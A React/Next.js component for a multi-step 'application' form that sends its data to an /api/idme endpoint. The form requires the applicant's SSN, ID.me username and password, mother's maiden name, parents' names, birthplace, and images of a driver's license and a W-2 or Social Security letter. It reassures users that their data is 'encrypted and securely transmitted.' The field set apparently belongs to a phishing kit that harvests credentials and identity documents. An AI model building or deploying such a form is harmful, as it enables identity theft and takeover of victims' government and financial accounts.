// app/components/ApplicationForm.tsx
"use client";

import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Header from "./Header";
import PersonalInfoSection from "./PersonalInfoSection";
import IdentityInfoSection from "./IdentityInfoSection";
import DocumentUploadSection from "./DocumentUploadSection";
import FormStepper from "./FormStepper";
import FormProgress from "./FormProgress";
import { initialFormState, useSecureFill } from "@/app/hook/useSecureFill";
import FamilyInfoSection from "./FamilyInfoSection";

export default function ApplicationForm() {
 
  const router = useRouter();
  const {
    submitting,
    message,
    setMessage,
    validate,
    form,
    setSubmitting,
    setForm,
    errors,
    setErrors,
    handleChange,handleDateChange, handleFileChange
  } = useSecureFill();
  
  const [currentStep, setCurrentStep] = useState(1);
  const [stepErrors, setStepErrors] = useState<{[key: number]: string[]}>({});
  const totalSteps = 4;

  // Step-specific validation functions
  const validateStep1 = (): boolean => {
    const stepErrors: {[key: string]: string} = {};
    const requiredFields = [
      'firstName', 'lastName', 'address', 'city', 'state', 
      'zipCode', 'email', 'phone', 'dob'
    ];

    requiredFields.forEach(field => {
      if (!form[field as keyof typeof form] || 
          (typeof form[field as keyof typeof form] === 'string' && 
           (form[field as keyof typeof form] as string).trim() === '')) {
        stepErrors[field] = 'This field is required';
      }
    });

    // Email validation
    if (form.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) {
      stepErrors.email = 'Please enter a valid email address';
    }

    // Phone validation
    // if (form.phone && !/^[\+]?[1-9][\d]{0,2}[\s]?[(]?[1-9]\d{2}[)]?[\s]?\d{3}[\s]?\d{4}$/.test(form.phone.replace(/\D/g, ''))) {
    //   stepErrors.phone = 'Please enter a valid phone number';
    // }

    // ZIP code validation
    if (form.zipCode && !/^\d{5}(-\d{4})?$/.test(form.zipCode)) {
      stepErrors.zipCode = 'Please enter a valid ZIP code';
    }

    // Date of birth validation
    if (form.dob) {
      const dobDate = new Date(form.dob);
      const today = new Date();
      const minDate = new Date();
      minDate.setFullYear(today.getFullYear() - 150);
      const maxDate = new Date();
      maxDate.setFullYear(today.getFullYear() - 13);
      
      if (dobDate < minDate) {
        stepErrors.dob = 'Please enter a valid date of birth';
      } else if (dobDate > maxDate) {
        stepErrors.dob = 'You must be at least 13 years old';
      }
    }

    // Update errors only for current step fields
    const newErrors = { ...errors };
    Object.keys(stepErrors).forEach(key => {
      newErrors[key] = stepErrors[key];
    });
    setErrors(newErrors);

    return Object.keys(stepErrors).length === 0;
  };

  const validateStep2 = (): boolean => {
    const stepErrors: {[key: string]: string} = {};
    const requiredFields = ['ssn', 'idmeUsername', 'idmePassword', 'stateOfBirth', 'cityOfBirth'];

    requiredFields.forEach(field => {
      if (!form[field as keyof typeof form] || 
          (typeof form[field as keyof typeof form] === 'string' && 
           (form[field as keyof typeof form] as string).trim() === '')) {
        stepErrors[field] = 'This field is required';
      }
    });

    // SSN validation
    if (form.ssn && !/^\d{3}-?\d{2}-?\d{4}$/.test(form.ssn)) {
      stepErrors.ssn = 'Please enter a valid SSN (XXX-XX-XXXX)';
    }

    // Update errors
    const newErrors = { ...errors };
    Object.keys(stepErrors).forEach(key => {
      newErrors[key] = stepErrors[key];
    });
    setErrors(newErrors);

    return Object.keys(stepErrors).length === 0;
  };

  const validateStep3 = (): boolean => {
    const stepErrors: {[key: string]: string} = {};
    const requiredFields = ['motherFirst', 'motherLast', 'fatherFirst', 'fatherLast', 'mothersMaiden'];

    requiredFields.forEach(field => {
      if (!form[field as keyof typeof form] || 
          (typeof form[field as keyof typeof form] === 'string' && 
           (form[field as keyof typeof form] as string).trim() === '')) {
        stepErrors[field] = 'This field is required';
      }
    });

    // Update errors
    const newErrors = { ...errors };
    Object.keys(stepErrors).forEach(key => {
      newErrors[key] = stepErrors[key];
    });
    setErrors(newErrors);

    return Object.keys(stepErrors).length === 0;
  };

  const validateStep4 = (): boolean => {
    const stepErrors: {[key: string]: string} = {};

    // File validation
    if (!form.dlFront) {
      stepErrors.dlFront = 'Driver\'s license front is required';
    }

    if (!form.dlBack) {
      stepErrors.dlBack = 'Driver\'s license back is required';
    }

    if (!form.W2SSl) {
      stepErrors.W2SSl = 'W-2 or Social Security letter is required';
    }

    // Update errors
    const newErrors = { ...errors };
    Object.keys(stepErrors).forEach(key => {
      newErrors[key] = stepErrors[key];
    });
    setErrors(newErrors);

    return Object.keys(stepErrors).length === 0;
  };

  // Function to validate current step
  const validateCurrentStep = (): boolean => {
    switch (currentStep) {
      case 1:
        return validateStep1();
      case 2:
        return validateStep2();
      case 3:
        return validateStep3();
      case 4:
        return validateStep4();
      default:
        return true;
    }
  };

  // Function to check if current step has errors
  const hasStepErrors = (): boolean => {
    const stepFields: {[key: number]: string[]} = {
      1: ['firstName', 'lastName', 'address', 'city', 'state', 'zipCode', 'email', 'phone', 'dob'],
      2: ['ssn', 'idmeUsername', 'idmePassword', 'stateOfBirth', 'cityOfBirth'],
      3: ['motherFirst', 'motherLast', 'fatherFirst', 'fatherLast', 'mothersMaiden'],
      4: ['dlFront', 'dlBack', 'W2SSl']
    };

    const currentStepFields = stepFields[currentStep] || [];
    return currentStepFields.some(field => errors[field]);
  };

  // Clear errors for previous step when moving forward
  const clearStepErrors = (step: number) => {
    const stepFields: {[key: number]: string[]} = {
      1: ['firstName', 'lastName', 'address', 'city', 'state', 'zipCode', 'email', 'phone', 'dob'],
      2: ['ssn', 'idmeUsername', 'idmePassword', 'stateOfBirth', 'cityOfBirth'],
      3: ['motherFirst', 'motherLast', 'fatherFirst', 'fatherLast', 'mothersMaiden'],
      4: ['dlFront', 'dlBack', 'W2SSl']
    };

    const fieldsToClear = stepFields[step] || [];
    const newErrors = { ...errors };
    fieldsToClear.forEach(field => {
      delete newErrors[field];
    });
    setErrors(newErrors);
  };

  const handleNext = () => {
    setMessage(null);
    
    // Validate current step
    const isValid = validateCurrentStep();
    
    if (!isValid) {
      // Don't show a separate message since we're listing errors above
      // Just scroll to first error
      setTimeout(() => {
        const firstErrorField = Object.keys(errors)[0];
        if (firstErrorField) {
          const element = document.getElementById(firstErrorField);
          element?.scrollIntoView({ 
            behavior: 'smooth', 
            block: 'center' 
          });
        }
      }, 100);
      
      return;
    }
  
    // Clear step errors since validation passed
    clearStepErrors(currentStep);
    
    if (currentStep < totalSteps) {
      setCurrentStep(currentStep + 1);
    }
  };

  const handleBack = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
      setMessage(null);
    }
  };

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    setMessage(null);

    // Validate all steps before submission
    if (!validate()) {
      setMessage({
        type: 'error',
        text: 'Please fix all validation errors before submitting.'
      });
      return;
    }
    

    setSubmitting(true);
    try {
      const fd = new FormData();
      
      // Append text fields
      Object.entries(form).forEach(([key, value]) => {
        if (value instanceof File || value === null) return;
        if (value !== undefined && value !== "") {
          fd.append(key, value.toString());
        }
      });
      
      // Append files
      if (form.dlFront) fd.append("dlFront", form.dlFront);
      if (form.dlBack) fd.append("dlBack", form.dlBack);
      if (form.W2SSl) fd.append("W2SSl", form.W2SSl);

      const res = await fetch("/api/idme", { 
        method: "POST", 
        body: fd 
      });
      
      const data = await res.json();
      if (res.ok) {
        setMessage({ 
          type: "success", 
          text: "Application submitted successfully! Redirecting..." 
        });
        setForm(initialFormState);
        setTimeout(() => {
          router.push("/applicants/secure-fill/thank-you");
        }, 1500);
      } else {
        setMessage({ 
          type: "error", 
          text: data.error || "Submission failed. Please try again." 
        });
      }
    } catch (err: any) {
      setMessage({ 
        type: "error", 
        text: err.message || "Unexpected error occurred" 
      });
    } finally {
      setSubmitting(false);
    }
  }

  // Effect to clear message when step changes
  useEffect(() => {
    setMessage(null);
  }, [currentStep, setMessage]);

  const renderStepContent = () => {
    switch (currentStep) {
      case 1:
        return <PersonalInfoSection   form={form}
        errors={errors}
        handleChange={handleChange}
        handleDateChange={handleDateChange}/>;
      case 2:
        return <IdentityInfoSection form={form}
        errors={errors}
        handleChange={handleChange}
        handleDateChange={handleDateChange} />;
      case 3:
        return <FamilyInfoSection
         form={form}
        errors={errors}
        handleChange={handleChange}
        handleDateChange={handleDateChange}/>;
      case 4:
        return <DocumentUploadSection  form={form}
        errors={errors}
        handleChange={handleChange}
        handleDateChange={handleDateChange}
        handleFileChange={handleFileChange}/>;
      default:
        return <PersonalInfoSection 
          form={form}
        errors={errors}
        handleChange={handleChange}
        handleDateChange={handleDateChange}/>;
    }
  };
  const getFieldLabel = (fieldName: string): string => {
    const labels: {[key: string]: string} = {
      // Step 1
      firstName: 'First Name',
      lastName: 'Last Name',
      otherNames: 'Other Names',
      address: 'Address',
      city: 'City',
      state: 'State',
      zipCode: 'ZIP Code',
      email: 'Email Address',
      phone: 'Phone Number',
      dob: 'Date of Birth',
      
      // Step 2
      ssn: 'Social Security Number',
      idmeUsername: 'ID.me Username',
      idmePassword: 'ID.me Password',
      stateOfBirth: 'State of Birth',
      cityOfBirth: 'City of Birth',
      
      // Step 3
      motherFirst: 'Mother\'s First Name',
      motherLast: 'Mother\'s Last Name',
      fatherFirst: 'Father\'s First Name',
      fatherLast: 'Father\'s Last Name',
      mothersMaiden: 'Mother\'s Maiden Name',
      
      // Step 4
      dlFront: 'Driver\'s License (Front)',
      dlBack: 'Driver\'s License (Back)',
      W2SSl: 'W-2 or Social Security Letter'
    };
    
    return labels[fieldName] || fieldName;
  };

  return (
    <main className="min-h-screen bg-gradient-to-b from-gray-50 to-blue-50">
      <div className="max-w-4xl mx-auto px-4 py-8">
        <Header />
        
        <FormStepper 
          currentStep={currentStep} 
          totalSteps={totalSteps} 
        />
        
        <FormProgress 
          currentStep={currentStep}
          totalSteps={totalSteps}
        />

        {/* Step validation indicator */}
        {hasStepErrors() && (
  <div className="mb-4 p-4 bg-red-50 border border-red-200 rounded-lg">
    <div className="flex justify-between items-center mb-3">
      <div className="flex items-center text-red-800">
        <i className="fas fa-exclamation-triangle mr-2"></i>
        <span className="font-medium">
          {(() => {
            const errorCount = Object.keys(errors).length;
            return `${errorCount} error${errorCount !== 1 ? 's' : ''} need${errorCount === 1 ? 's' : ''} to be fixed`;
          })()}
        </span>
      </div>
      <button
        type="button"
        onClick={() => {
          const firstErrorField = Object.keys(errors)[0];
          if (firstErrorField) {
            const element = document.getElementById(firstErrorField);
            element?.scrollIntoView({ 
              behavior: 'smooth', 
              block: 'center' 
            });
          }
        }}
        className="text-sm text-red-600 hover:text-red-800 flex items-center"
      >
        <i className="fas fa-arrow-down mr-1"></i>
        Jump to first error
      </button>
    </div>
    <ul className="space-y-2">
      {(() => {
        const stepFields: {[key: number]: string[]} = {
          1: ['firstName', 'lastName', 'address', 'city', 'state', 'zipCode', 'email', 'phone', 'dob'],
          2: ['ssn', 'idmeUsername', 'idmePassword', 'stateOfBirth', 'cityOfBirth'],
          3: ['motherFirst', 'motherLast', 'fatherFirst', 'fatherLast', 'mothersMaiden'],
          4: ['dlFront', 'dlBack', 'W2SSl']
        };
        
        const currentStepFields = stepFields[currentStep] || [];
        const currentStepErrors = currentStepFields
          .filter(field => errors[field])
          .map(field => ({
            field,
            message: errors[field],
            label: getFieldLabel(field)
          }));
        
        return currentStepErrors.map(error => (
          <li 
            key={error.field} 
            className="flex items-start bg-white border border-red-200 p-3 rounded hover:bg-red-50 transition-colors cursor-pointer"
            onClick={() => {
              const element = document.getElementById(error.field);
              element?.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
              });
              element?.focus();
            }}
          >
            <i className="fas fa-times text-red-500 mr-3 mt-0.5 flex-shrink-0"></i>
            <div className="flex-1">
              <span className="font-medium text-red-900 block">{error.label}</span>
              <span className="text-red-700 text-sm">{error.message}</span>
            </div>
            <i className="fas fa-chevron-right text-red-400 ml-2"></i>
          </li>
        ));
      })()}
    </ul>
  </div>
)}


        <form
          onSubmit={onSubmit}
          className="mt-4 bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden"
          encType="multipart/form-data"
        >
          <div className="p-6 md:p-8">
            {renderStepContent()}
          </div>

          <div className="flex flex-col md:flex-row justify-between items-center p-6 bg-gray-50 border-t border-gray-200 space-y-4 md:space-y-0">
            <div>
              {currentStep > 1 && (
                <button
                  type="button"
                  onClick={handleBack}
                  disabled={submitting}
                  className="px-6 py-3 text-gray-700 hover:text-gray-900 font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center"
                >
                  <i className="fas fa-arrow-left mr-2"></i>
                  Back
                </button>
              )}
            </div>

            <div className="flex items-center space-x-4">
              {currentStep < totalSteps ? (
                <button
                  type="button"
                  onClick={handleNext}
                  disabled={submitting || hasStepErrors()}
                  className={`px-6 py-3 font-medium rounded-lg transition-colors flex items-center ${
                    hasStepErrors()
                      ? 'bg-gray-300 text-gray-500 cursor-not-allowed'
                      : 'bg-blue-600 text-white hover:bg-blue-700'
                  }`}
                >
                  Continue
                  <i className="fas fa-arrow-right ml-2"></i>
                </button>
              ) : (
                <button
                  type="submit"
                  disabled={submitting || hasStepErrors()}
                  className={`px-6 py-3 font-medium rounded-lg flex items-center ${
                    hasStepErrors()
                      ? 'bg-gray-300 text-gray-500 cursor-not-allowed'
                      : 'bg-green-600 text-white hover:bg-green-700 transition-colors'
                  } disabled:opacity-50 disabled:cursor-not-allowed`}
                >
                  {submitting ? (
                    <>
                      <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-b-2 border-white mr-2"></div>
                      Submitting...
                    </>
                  ) : (
                    <>
                      <i className="fas fa-paper-plane mr-2"></i>
                      Submit Application
                    </>
                  )}
                </button>
              )}
            </div>
          </div>
        </form>

        {message && (
          <div className={`mt-4 p-4 rounded-lg ${
            message.type === 'success' 
              ? 'bg-green-50 border border-green-200 text-green-700' 
              : 'bg-red-50 border border-red-200 text-red-700'
          }`}>
            <div className="flex items-center">
              <i className={`fas ${
                message.type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'
              } mr-2`}></i>
              <span>{message.text}</span>
            </div>
          </div>
        )}

        <div className="mt-8 text-center text-gray-500 text-sm">
          <p>
            <i className="fas fa-lock mr-2"></i>
            Your information is encrypted and securely transmitted
          </p>
        </div>
      </div>
    </main>
  );
}